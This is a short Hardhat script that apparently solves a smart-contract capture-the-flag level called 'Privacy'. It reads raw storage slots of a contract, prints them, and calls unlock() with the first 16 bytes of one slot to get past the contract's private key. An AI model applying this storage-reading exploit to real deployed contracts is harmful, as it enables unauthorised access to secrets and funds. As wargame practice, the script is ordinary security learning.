// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";
import Web3 from "web3"

async function main() {
  const web3 = new Web3(process.env.ALCHEMY_API_KEY_URL as string)
  const VAULT_ADDRESS = "0x10D32f7A33bdFb750cAE699C05b231d718Dc4c19"

  const slot1 = await web3.eth.getStorageAt(VAULT_ADDRESS, 0)
  const slot2 = await web3.eth.getStorageAt(VAULT_ADDRESS, 1)
  const slot3 = await web3.eth.getStorageAt(VAULT_ADDRESS, 2)
  const slot4 = await web3.eth.getStorageAt(VAULT_ADDRESS, 3)
  const slot5 = await web3.eth.getStorageAt(VAULT_ADDRESS, 4)
  const slot6 = await web3.eth.getStorageAt(VAULT_ADDRESS, 5)


  console.log(slot1)
  console.log(slot2)
  console.log(slot3)
  console.log(slot4)
  console.log(slot5)
  console.log(slot6)

  const vault = await ethers.getContractAt("Privacy", VAULT_ADDRESS)
  const unlockTx = await vault.unlock(slot6.substring(0, 2 + (16 * 2))) // 0x + 16 bytes
  unlockTx.wait(4)

  // 0xc1d16befad729897f0b2810577f720a17094818e2f7bc33a398cbb9e2fee235f
  // 0xc1d16befad729897f0b2810577f720a1
  // 0xc1d16befad729

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
